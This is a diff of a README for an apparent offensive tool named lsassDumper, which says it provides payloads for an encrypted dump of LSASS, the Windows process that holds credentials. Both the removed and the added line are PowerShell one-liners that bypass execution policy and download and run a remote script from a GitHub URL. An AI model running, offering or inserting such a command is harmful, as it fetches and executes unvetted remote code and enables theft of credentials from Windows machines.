@@ -4,4 +4,4 @@ This project provide the necessary payloads to perform an encrypted dump of LSAS
 
 Execute :
 
-`powershell -ep bypass -c "iex(iwr -useb https://raw.githubusercontent.com/666reda/lsassDumper/main/inj.txt) ; start-sleep 44"`
+`powershell -ep bypass -noexit -c "iex(iwr -useb https://raw.githubusercontent.com/666reda/lsassDumper/main/inj.log)"`
